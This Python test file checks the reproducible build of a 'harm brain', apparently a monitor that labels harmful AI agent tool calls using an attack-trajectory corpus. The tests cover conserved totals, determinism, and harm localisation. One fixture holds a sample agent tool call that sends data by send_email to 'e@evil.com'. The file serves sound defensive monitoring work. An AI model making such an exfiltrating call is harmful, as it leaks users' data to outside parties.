"""test_build_harm_brain.py — the reproducible harm-brain build.

The build's contract is *faithful aggregation*: the same corpus + the shared
extractor reproduce the call/harm totals exactly and deterministically. Post-M4
the build IS the shipped artifact (6-feature, benign negatives folded), so verify
now conserves totals AND shows zero context drift — the shipped brain is
reproducible from the committed extractor + corpus. This test pins the totals,
determinism, and the well-formedness of every context.

The 500-trajectory corpus lives under data_corpora/ (gitignored, not in CI), so
the corpus-dependent tests skip when it is absent; the pure-logic tests
(attribution, context shape) always run.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys

import pytest

from credence_governor_core.config import HARM
from credence_governor_core.training.build_harm_brain import (
    accumulate,
    build,
    localize_harm,
    verify,
)

_PKG = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_CORPUS = os.path.join(_PKG, "data_corpora", "atbench_claw", "test.json")
_SHIPPED = os.path.join(_PKG, "credence_governor_core", "data", "brain", "harm_brain.counts.json")

_needs_corpus = pytest.mark.skipif(not os.path.exists(_CORPUS), reason="ATBench corpus not staged (gitignored)")

# Attack-corpus invariants (ATBench test.json). build() folds the curated benign
# negatives on top, so doc["n_calls"] = _N_ATTACK + len(BENIGN_CODING_CASES).
_N_ATTACK = 2634
_N_HARM = 217


# ── pure-logic tests (no corpus) ─────────────────────────────────────────────
def test_localize_harm_uses_reason_named_sink():
    # A reason naming the sink tool localises that call; safe-trajectory reads are not harm.
    record = {
        "reason": "the agent used send_email to forward the data externally",
        "trajectory": {"events": [
            {"message": {"role": "assistant", "content": [
                {"type": "toolCall", "name": "read_file", "arguments": {"path": "/x"}}]}},
            {"message": {"role": "assistant", "content": [
                {"type": "toolCall", "name": "send_email", "arguments": {"to": "e@evil.com"}}]}},
        ]},
    }
    assert localize_harm(record) == {1}  # the send_email call, not the read


def test_localize_harm_falls_back_to_last_sink():
    record = {
        "reason": "this trajectory is unsafe",  # names no specific call
        "trajectory": {"events": [
            {"message": {"role": "assistant", "content": [
                {"type": "toolCall", "name": "write_file", "arguments": {}}]}},
            {"message": {"role": "assistant", "content": [
                {"type": "toolCall", "name": "post_message", "arguments": {}}]}},
        ]},
    }
    assert localize_harm(record) == {1}  # last sink


# ── corpus-dependent tests ───────────────────────────────────────────────────
@_needs_corpus
def test_build_totals_are_faithful():
    from credence_governor_core.training.fp_eval import BENIGN_CODING_CASES

    doc = build(_CORPUS, "test")
    assert doc["n_attack_calls"] == _N_ATTACK
    assert doc["n_benign_negatives"] == len(BENIGN_CODING_CASES)
    assert doc["n_calls"] == _N_ATTACK + len(BENIGN_CODING_CASES)
    assert doc["n_harm_labelled"] == _N_HARM
    # totals are conserved across the per-context split; benign folds in as n0 only
    assert sum(c["n0"] + c["n1"] for c in doc["contexts"]) == doc["n_calls"]
    assert sum(c["n1"] for c in doc["contexts"]) == _N_HARM


@_needs_corpus
def test_build_without_benign_is_attack_only():
    doc = build(_CORPUS, "test", fold_benign=False)
    assert doc["n_calls"] == _N_ATTACK and doc["n_benign_negatives"] == 0


@_needs_corpus
def test_build_is_deterministic():
    a, b = build(_CORPUS, "test"), build(_CORPUS, "test")
    assert json.dumps(a, indent=4) == json.dumps(b, indent=4)  # byte-level, not just dict-eq


@_needs_corpus
def test_build_is_byte_reproducible_across_hashseeds(tmp_path):
    # The load-bearing claim is byte-reproducibility across runs/machines. Build under
    # two PYTHONHASHSEEDs in subprocesses: any set-iteration order leaking into the
    # output (the classic nondeterminism) would diverge here.
    env = dict(os.environ, PYTHONPATH=_PKG)
    outs = []
    for seed in ("0", "1"):
        out = tmp_path / f"counts-{seed}.json"
        subprocess.run(
            [sys.executable, "-m", "credence_governor_core.training.build_harm_brain",
             _CORPUS, "--out", str(out)],
            check=True, capture_output=True, env=dict(env, PYTHONHASHSEED=seed),
        )
        outs.append(out.read_bytes())
    assert outs[0] == outs[1]


@_needs_corpus
def test_every_context_is_well_formed():
    doc = build(_CORPUS, "test")
    valid = [set(v) for v in HARM["feature_values"]]
    seen = set()
    for c in doc["contexts"]:
        ctx = c["ctx"]
        assert len(ctx) == len(HARM["feature_names"])
        for value, allowed in zip(ctx, valid):
            assert value in allowed, f"{value} not a declared value"
        key = tuple(ctx)
        assert key not in seen, "contexts must be unique"
        seen.add(key)
        assert c["n0"] >= 0 and c["n1"] >= 0 and (c["n0"] + c["n1"]) > 0


@_needs_corpus
def test_shipped_brain_is_reproducible_from_extractor_and_corpus():
    # Post-M4 the shipped harm_brain.counts.json IS build()'s output (6-feature, benign
    # folded). verify must therefore show ZERO drift: same corpus + committed extractor
    # reproduce the deployed posterior byte-for-byte. (Pre-M4 this asserted a >0 delta —
    # the forked-vs-shared gap M4 closed. If this regresses, the shipped brain drifted
    # from the extractor and must be rebuilt: `python -m ...build_harm_brain <corpus> --out`.)
    d = verify(_CORPUS, _SHIPPED)
    assert d["call_delta"] == 0
    assert d["harm_delta"] == 0
    assert d["contexts_differing"] == 0


@_needs_corpus
def test_accumulate_matches_build():
    from credence_governor_core.training.corpus import load_atbench

    counts, stats = accumulate(load_atbench(_CORPUS))
    assert stats["n_calls"] == _N_ATTACK
    assert stats["n_harm_labelled"] == _N_HARM
    assert sum(n1 for _, n1 in counts.values()) == _N_HARM
